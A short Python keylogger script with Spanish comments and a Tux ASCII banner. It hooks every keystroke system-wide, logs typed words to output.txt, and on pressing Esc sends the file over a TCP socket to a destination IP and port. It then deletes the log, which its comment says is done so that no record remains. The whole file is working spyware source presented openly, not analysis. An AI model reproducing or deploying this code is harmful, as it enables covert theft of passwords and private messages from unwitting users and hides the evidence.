def print_tux():
    print("""
               .--.
              |o_o |
              |:_/ |
             //   \\ \\
            (|     | )
           /'\\_   _/`\\
           \\___)=(___/
****************************************
*                                      *
*       Que comience la magia!!!!      *
*                                      *  
****************************************            
            """)

# Dibujo de Tux con saludo
print_tux()

import keyboard
import sys 
import socket
import os


word = ""
direction_ip_destiny = 'IP-Destino'
destiny_port = 'Puerto destino'
file_to_send = 'output.txt'


# La funcion se activa cada vez que se presiona una tecla
def press_key(press):

    global word

    # Cada vez que se preione el espacio se lla a la funcion 'save_word_to_sapce'
    # para guardar la palabra en el archivo "output.txt"
    if press.event_type == keyboard.KEY_DOWN:
        if press.name == 'space':
            save_word_to_space()
        # Mientras no se presione el espacio, se sigue agregando la letra a la palabra    
        elif len(press.name) == 1 and press.name.isprintable():
                word += press.name

# Envio cada pulsacion a la funcion press_key
keyboard.hook(press_key)

# Abro el archivo en modo escritura y agrego la palabra segguido de un salto de linea
def save_word_to_space():
    with open("output.txt", "a") as file:

        file.write(word + "\n")
    print(f"Palabra registrada: {word}")
    # LLamo a la funcion para reestablecer el registro
    reset_word()
# Funcion para reestablecer el registro en 0
def reset_word():
     global word
     word = ""

# Envio los archivos via socket
def send_adress_via_sockets(file_to_send, direction_ip_destiny, destiny_port):
    try:
        # Abro el archivo y lo leo en modo binario
        with open(file_to_send, 'rb') as file:
            content = file.read()
            # Envio el arvhivo a traves del socket
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as connection:
                connection.connect((direction_ip_destiny, destiny_port))
                connection.sendall(content)
                # Elimino el archivo para que no haya registro
                os.remove("output.txt")
                sys.exit()
    except Exception as e:
        print(f"Hubo un error en la conexion: {e} ")


# Detengo el programa
def stop_script():
    print("Detenemos script y enviamos los datos")
    keyboard.unhook_all()
    # Llamo a la funcion para enviar el archivo a traves de sockets
    send_adress_via_sockets(file_to_send, direction_ip_destiny, destiny_port)

try:
    keyboard.wait("esc")
    stop_script()
except KeyboardInterrupt:
    print("Script detenido")
    pass
    
# Bibliotecas
# keyboard: Captura las pulsaciones de las teclas del usuario
# Socket: # Envio el archivo a una direccion IP y puerto especifico a traves de Socket TCP

# keyboard.hool(): Estalece ganchos de teclado. Permite monitorear y responder
# a las pulsaciones de teclas mientras el programa esta en ejecucion.
